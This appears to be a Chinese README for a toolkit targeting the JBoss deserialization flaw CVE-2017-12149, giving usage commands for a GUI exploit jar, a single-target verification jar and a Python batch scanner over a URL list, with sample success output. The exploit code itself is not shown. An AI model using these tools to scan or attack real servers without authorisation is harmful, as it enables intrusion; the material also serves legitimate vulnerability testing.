# 
1.jboss反序列化_CVE-2017-12149.jar GUI
jboss-_CVE-2017-12149

#referer:https://github.com/yunxu1/jboss-_CVE-2017-12149

2.漏洞验证
verify_CVE-2017-12149.jar提供命令行模式下验证漏洞,如果漏洞存在返回特征字符串,只需要执行命令:

```shell/cmd
$ java -jar verify_CVE-2017-12149.jar http://xxx:8080

#成功返回:
vuln6581362514513155613jboss
```
#referer:https://github.com/yunxu1/jboss-_CVE-2017-12149

3.批量验证漏洞(支持http/https协议)
python Jboss-cve201712149-pl.py urllist.txt
urllist.txt-format:
http://1.1.1.1:8080

#成功返回:
http://192.168.1.10:8080/invoker/readonly maybe use HttpInvoker! 
http://192.168.1.10:8080 is  Vul-Jboss-cve-2017-12149! 
ps：py运行需要安装requests 库
pip install requests